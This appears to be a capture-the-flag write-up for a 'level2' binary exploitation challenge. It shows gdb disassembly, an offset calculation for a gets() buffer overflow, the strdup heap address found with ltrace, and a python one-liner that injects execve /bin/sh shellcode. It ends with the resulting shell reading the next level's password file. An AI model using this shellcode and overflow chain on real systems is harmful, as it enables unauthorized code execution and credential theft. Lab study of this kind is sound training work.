gdb level2

disassemble main
disassemble p

there is a _gets_ function call in p()
there is a call to strdup on a buffer that can be overflowed
/------------------------------------/

    We can calculate the offset
    https://projects.jason-rush.com/tools/buffer-overflow-eip-offset-string-generator/

    (gdb) run 
    Starting program: /home/user/level2/level2 
    Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
    Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0A6Ac72Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A

    Program received signal SIGSEGV, Segmentation fault.
    0x37634136 in ?? ()

    OFFSET: 80

/------------------------------------/
    As heap allocation is not randomized, the string will always be on the same address. (This doesn't happen on any system nowadays)
    using ltrace we can find where strdup string is located:

    ltrace ./level2
    AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
    strdup("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"...)           = 0x0804a008

    0x0804a008 -> \x08\xa0\x04\x08

/------------------------------------/

Some little shellcode found here:
http://shell-storm.org/shellcode/files/shellcode-811.php
Length: 28 bytes

The string consists of the shellcode + the rest of the buffer "AAA" + the address of the strdup'd memory.

python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73" + "\x68\x68\x2f\x62\x69\x6e\x89" + "\xe3\x89\xc1\x89\xc2\xb0\x0b"+ "\xcd\x80\x31\xc0\x40\xcd\x80" + "a" * (80 - 28) +  "\x08\xa0\x04\x08" ' > /tmp/exploit ; cat /tmp/exploit - | ~/level2

whoami
level3
cat /home/user/level3/.pass
492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02